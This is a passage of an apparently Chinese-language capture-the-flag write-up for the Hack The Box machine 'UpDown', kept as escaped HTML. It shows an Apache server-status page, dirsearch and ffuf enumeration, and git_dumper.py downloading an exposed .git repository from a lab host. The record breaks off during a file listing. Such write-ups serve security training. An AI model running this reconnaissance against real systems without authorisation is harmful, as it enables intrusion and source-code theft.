class="hljs-number">0.10</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">0</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">0</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">14338</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">17.1</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">0.53</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">4.16</span><br>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.39</span>&lt;/td&gt;&lt;td&gt;http/<span class="hljs-number">1.1</span>&lt;/td&gt;&lt;td nowrap&gt;localhost:<span class="hljs-number">80</span>&lt;/td&gt;&lt;td nowrap&gt;GET /<span class="hljs-number">20070113</span> HTTP/<span class="hljs-number">1.1</span>&lt;/td&gt;&lt;/tr&gt;<br><br>&lt;tr&gt;&lt;td&gt;&lt;b&gt;<span class="hljs-number">4</span><span class="hljs-number">-0</span>&lt;/b&gt;&lt;/td&gt;&lt;td&gt;<span class="hljs-number">1356</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">30</span>/<span class="hljs-number">1280</span>/<span class="hljs-number">4673</span>&lt;/td&gt;&lt;td&gt;&lt;b&gt;K&lt;/b&gt;<br>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">0.12</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">0</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">0</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">10005</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">16.1</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">0.67</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">2.47</span><br>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.39</span>&lt;/td&gt;&lt;td&gt;http/<span class="hljs-number">1.1</span>&lt;/td&gt;&lt;td nowrap&gt;localhost:<span class="hljs-number">80</span>&lt;/td&gt;&lt;td nowrap&gt;GET /goldmedalPlea HTTP/<span class="hljs-number">1.1</span>&lt;/td&gt;&lt;/tr&gt;<br><br>&lt;tr&gt;&lt;td&gt;&lt;b&gt;<span class="hljs-number">80</span><span class="hljs-number">-0</span>&lt;/b&gt;&lt;/td&gt;&lt;td&gt;-&lt;/td&gt;&lt;td&gt;<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span>&lt;/td&gt;&lt;td&gt;.<br>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">0.00</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">487</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">0</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">0</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">0.0</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">0.00</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">0.00</span><br>&lt;/td&gt;&lt;td&gt;::<span class="hljs-number">1</span>&lt;/td&gt;&lt;td&gt;http/<span class="hljs-number">1.1</span>&lt;/td&gt;&lt;td nowrap&gt;localhost:<span class="hljs-number">80</span>&lt;/td&gt;&lt;td nowrap&gt;OPTIONS * HTTP/<span class="hljs-number">1.0</span>&lt;/td&gt;&lt;/tr&gt;<br><br>&lt;/table&gt;<br> &lt;hr /&gt; &lt;table&gt;<br> &lt;tr&gt;&lt;th&gt;Srv&lt;/th&gt;&lt;td&gt;Child Server number - generation&lt;/td&gt;&lt;/tr&gt;<br> &lt;tr&gt;&lt;th&gt;PID&lt;/th&gt;&lt;td&gt;OS process ID&lt;/td&gt;&lt;/tr&gt;<br> &lt;tr&gt;&lt;th&gt;Acc&lt;/th&gt;&lt;td&gt;Number of accesses this connection / this child / this slot&lt;/td&gt;&lt;/tr&gt;<br> &lt;tr&gt;&lt;th&gt;M&lt;/th&gt;&lt;td&gt;Mode of operation&lt;/td&gt;&lt;/tr&gt;<br>&lt;tr&gt;&lt;th&gt;CPU&lt;/th&gt;&lt;td&gt;CPU usage, number of seconds&lt;/td&gt;&lt;/tr&gt;<br>&lt;tr&gt;&lt;th&gt;SS&lt;/th&gt;&lt;td&gt;Seconds since beginning of most recent request&lt;/td&gt;&lt;/tr&gt;<br> &lt;tr&gt;&lt;th&gt;Req&lt;/th&gt;&lt;td&gt;Milliseconds required to process most recent request&lt;/td&gt;&lt;/tr&gt;<br> &lt;tr&gt;&lt;th&gt;Dur&lt;/th&gt;&lt;td&gt;Sum of milliseconds required to process all requests&lt;/td&gt;&lt;/tr&gt;<br> &lt;tr&gt;&lt;th&gt;Conn&lt;/th&gt;&lt;td&gt;Kilobytes transferred this connection&lt;/td&gt;&lt;/tr&gt;<br> &lt;tr&gt;&lt;th&gt;Child&lt;/th&gt;&lt;td&gt;Megabytes transferred this child&lt;/td&gt;&lt;/tr&gt;<br> &lt;tr&gt;&lt;th&gt;Slot&lt;/th&gt;&lt;td&gt;Total megabytes transferred this slot&lt;/td&gt;&lt;/tr&gt;<br> &lt;/table&gt;<br>&lt;hr /&gt;<br>&lt;address&gt;Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.41</span> (Ubuntu) Server at siteisup.htb Port <span class="hljs-number">80</span>&lt;/address&gt;<br>&lt;/body&gt;&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/UpDown-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ dirsearch -u http:<span class="hljs-comment">//10.10.11.177/dev/</span><br><br>  _|. _ _  _  _  _ _|_    v0<span class="hljs-number">.4</span><span class="hljs-number">.3</span><br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span class="hljs-number">25</span> | Wordlist size: <span class="hljs-number">11460</span><br><br>Output File: /home/kali/Desktop/reports/http_10<span class="hljs-number">.10</span><span class="hljs-number">.11</span><span class="hljs-number">.177</span>/_dev__24<span class="hljs-number">-04</span><span class="hljs-number">-28</span>_08<span class="hljs-number">-13</span><span class="hljs-number">-20.</span>txt<br><br>Target: http:<span class="hljs-comment">//10.10.11.177/</span><br><br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">20</span>] Starting: dev/<br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">315B</span>  - /dev/.git  -&gt;  http:<span class="hljs-comment">//10.10.11.177/dev/.git/      </span><br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">413B</span>  - /dev/.git/branches/                               <br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">602B</span>  - /dev/.git/<br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">73B</span>  - /dev/.git/description                             <br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">298B</span>  - /dev/.git/config<br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">21B</span>  - /dev/.git/HEAD                                    <br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">675B</span>  - /dev/.git/hooks/                                  <br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">521B</span>  - /dev/.git/index                                   <br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">459B</span>  - /dev/.git/info/                                   <br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">240B</span>  - /dev/.git/info/exclude                            <br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">483B</span>  - /dev/.git/logs/<br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">325B</span>  - /dev/.git/logs/refs  -&gt;  http:<span class="hljs-comment">//10.10.11.177/dev/.git/logs/refs/</span><br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">179B</span>  - /dev/.git/logs/HEAD<br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">331B</span>  - /dev/.git/logs/refs/heads  -&gt;  http:<span class="hljs-comment">//10.10.11.177/dev/.git/logs/refs/heads/</span><br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">333B</span>  - /dev/.git/logs/refs/remotes  -&gt;  http:<span class="hljs-comment">//10.10.11.177/dev/.git/logs/refs/remotes/</span><br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">340B</span>  - /dev/.git/logs/refs/remotes/origin  -&gt;  http:<span class="hljs-comment">//10.10.11.177/dev/.git/logs/refs/remotes/origin/</span><br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">179B</span>  - /dev/.git/logs/refs/remotes/origin/HEAD           <br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">466B</span>  - /dev/.git/objects/                                <br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">112B</span>  - /dev/.git/packed-refs<br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">326B</span>  - /dev/.git/refs/heads  -&gt;  http:<span class="hljs-comment">//10.10.11.177/dev/.git/refs/heads/</span><br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">473B</span>  - /dev/.git/refs/<br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">328B</span>  - /dev/.git/refs/remotes  -&gt;  http:<span class="hljs-comment">//10.10.11.177/dev/.git/refs/remotes/</span><br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">335B</span>  - /dev/.git/refs/remotes/origin  -&gt;  http:<span class="hljs-comment">//10.10.11.177/dev/.git/refs/remotes/origin/</span><br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">30B</span>  - /dev/.git/refs/remotes/origin/HEAD<br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">325B</span>  - /dev/.git/refs/tags  -&gt;  http:<span class="hljs-comment">//10.10.11.177/dev/.git/refs/tags/</span><br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">277B</span>  - /dev/.ht_wsr.txt                                  <br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">277B</span>  - /dev/.htaccess.bak1                               <br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">277B</span>  - /dev/.htaccess.save                               <br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">277B</span>  - /dev/.htaccess.sample<br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">277B</span>  - /dev/.htaccess.orig<br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">277B</span>  - /dev/.htaccess_extra                              <br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">277B</span>  - /dev/.htaccess_orig<br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">277B</span>  - /dev/.htaccess_sc<br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">277B</span>  - /dev/.htaccessBAK<br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">277B</span>  - /dev/.htaccessOLD<br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">277B</span>  - /dev/.htaccessOLD2<br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">277B</span>  - /dev/.html                                        <br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">277B</span>  - /dev/.htm                                         <br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">277B</span>  - /dev/.htpasswds                                   <br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">25</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">277B</span>  - /dev/.httr-oauth<br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">26</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">277B</span>  - /dev/.htpasswd_test                               <br>[<span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">27</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">277B</span>  - /dev/.php                                         <br>                                                                             <br>Task Completed <br></code></pre></td></tr></table></figure>
+
+<p><code>http://10.10.11.177/dev/</code></p>
+<p><code>http://10.10.11.177/dev/.git/</code></p>
+<p><img src="http://sh1yan.top/photo/UpDown-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、再此之前，再枚举下子域名信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ffuf -u http:<span class="hljs-comment">//siteisup.htb -H &#x27;Host: FUZZ.siteisup.htb&#x27; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 1131</span><br><br>        /<span class="hljs-string">&#x27;___\  /&#x27;</span>___\           /<span class="hljs-string">&#x27;___\       </span><br><span class="hljs-string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="hljs-string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="hljs-string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="hljs-string">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="hljs-string">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="hljs-string"></span><br><span class="hljs-string">       v2.1.0-dev</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string"> :: Method           : GET</span><br><span class="hljs-string"> :: URL              : http://siteisup.htb</span><br><span class="hljs-string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</span><br><span class="hljs-string"> :: Header           : Host: FUZZ.siteisup.htb</span><br><span class="hljs-string"> :: Follow redirects : false</span><br><span class="hljs-string"> :: Calibration      : false</span><br><span class="hljs-string"> :: Timeout          : 10</span><br><span class="hljs-string"> :: Threads          : 40</span><br><span class="hljs-string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="hljs-string"> :: Filter           : Response size: 1131</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">dev                     [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 4558ms]</span><br><span class="hljs-string">:: Progress: [19966/19966] :: Job [1/1] :: 188 req/sec :: Duration: [0:01:31] :: Errors: 0 ::</span><br><span class="hljs-string"></span><br><span class="hljs-string">echo &quot;10.10.11.177 dev.siteisup.htb&quot; | sudo tee -a /etc/hosts</span><br><span class="hljs-string"></span><br><span class="hljs-string">┌──(kali㉿offsec)-[~/Desktop]</span><br><span class="hljs-string">└─$ echo &quot;10.10.11.177 dev.siteisup.htb&quot; | sudo tee -a /etc/hosts</span><br><span class="hljs-string">[sudo] kali 的密码：</span><br><span class="hljs-string">10.10.11.177 dev.siteisup.htb</span><br></code></pre></td></tr></table></figure>
+
+<p><code>http://dev.siteisup.htb/</code></p>
+<p><img src="http://sh1yan.top/photo/UpDown-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>7、前期使用了gitdumper.sh 工具进行下载，结果该工具下载的文件不全，导致我一直卡着了，这里整个目录都翻遍了，也没发现自己想发现的内容，故查看writeup，发现是 .git 这里下载的文件不全，故换了个工具重新开始下载</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/git-dumper-py]<br>└─$ python3 git_dumper.py http:<span class="hljs-comment">//10.10.11.177/dev/.git ./temp </span><br>[-] Testing http:<span class="hljs-comment">//10.10.11.177/dev/.git/HEAD [200]</span><br>[-] Testing http:<span class="hljs-comment">//10.10.11.177/dev/.git/ [200]</span><br>[-] Fetching .git recursively<br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/ [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.gitignore [404]</span><br>[-] http:<span class="hljs-comment">//10.10.11.177/dev/.gitignore responded with status code 404</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/packed-refs [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/hooks/ [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/branches/ [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/config [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/HEAD [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/refs/ [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/hooks/fsmonitor-watchman.sample [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/hooks/pre-applypatch.sample [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/hooks/post-update.sample [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/hooks/commit-msg.sample [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/hooks/applypatch-msg.sample [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/hooks/pre-commit.sample [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/hooks/pre-rebase.sample [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/hooks/pre-merge-commit.sample [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/hooks/pre-receive.sample [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/hooks/pre-push.sample [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/logs/ [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/info/ [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/hooks/prepare-commit-msg.sample [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/refs/heads/ [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/hooks/update.sample [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/hooks/push-to-checkout.sample [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/refs/remotes/ [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/refs/tags/ [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/logs/HEAD [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/logs/refs/ [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/info/exclude [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/refs/heads/main [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/refs/remotes/origin/ [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/logs/refs/heads/ [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/logs/refs/remotes/ [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/refs/remotes/origin/HEAD [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/logs/refs/remotes/origin/ [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/logs/refs/heads/main [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/logs/refs/remotes/origin/HEAD [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/objects/ [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/description [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/index [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/objects/info/ [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/objects/pack/ [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack [200]</span><br>[-] Fetching http:<span class="hljs-comment">//10.10.11.177/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx [200]</span><br>[-] Sanitizing .git/config<br>[-] Running git checkout .<br>从索引区更新了 <span class="hljs-number">6</span> 个路径<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/UpDown-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>8、查看分析文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/git-dumper-py/temp]<br>└─$ ls -la                 <br>总计 <span class="hljs-number">40</span><br>drwxr-xr-x <span class="hljs-number">3</span> kali kali <span class="hljs-number">4096</span>  <span class="hljs-number">4</span>月<span class="hljs-number">28</span>日 <span class="hljs-number">22</span>:<span class="hljs-number">26</span> .<br>drwxrwxr-x <span class="hljs-number">3</span> kali kali <span class="hljs-number">4096</span>  <span class="hljs-number">4</span>月<span class="hljs-number">28</span>日 <span class="hljs-number">22</span>:<span class="hljs-number">26</span> ..<br>-rw-r--r-- <span class="hljs-number">1</span> kali kali   <span class="hljs-number">59</span>  <span class="hljs-number">4</span>月<span class="hljs-number">28</span>日 <span class="hljs-number">22</span>:<span class="hljs-number">26</span> admin.php<br>-rw-r--r-- <span class="hljs-number">1</span> kali kali  <span class="hljs-number">147</span>  <span class="hljs-number">4</span>月<span class="hljs-number">28</span>日 <span class="hljs-number">22</span>:<span class="hljs-number">26</span> changelog.txt<br>-rw-r--r-- <span class="hljs-number">1</span> kali kali <span class="hljs-number">3145</span>  <span class="hljs-number">4</span>月<span class="hljs-number">28</span>日 <span class="hljs-number">22</span>:<span class="hljs-number">26</span> checker.php<br>drwxr-xr-x <span class="hljs-number">7</span> kali kali <span class="hljs-number">4096</span>  <span class="hljs-number">4</span>月<span class="hljs-number">28</span>日 <span class="hljs-number">22</span>:<span class="hljs-number">26</span> .git<br>-rw-r--r-- <span class="hljs-number">1</span> kali kali  <span class="hljs-number">117</span>  <span class="hljs-number">4</span>月<span class="hljs-number">28</span>日 <span class="hljs-number">22</span>:<span class="hljs-number">26</span> .htaccess<br>-rw-r--r-- <span class="hljs-number">1</span> kali kali  <span class="hljs-number">273</span>  <span class="hljs-number">4</span>月<span class="hljs-number">28</span>日 <span class="hljs-number">22</span>:<span class="hljs-number">26</span> index.php<br>-rw-r--r-- <span class="hljs-number">1</span> kali kali <span class="hljs-number">5531</span>  <span class="hljs-number">4</span>月<span class="hljs-number">28</span>日 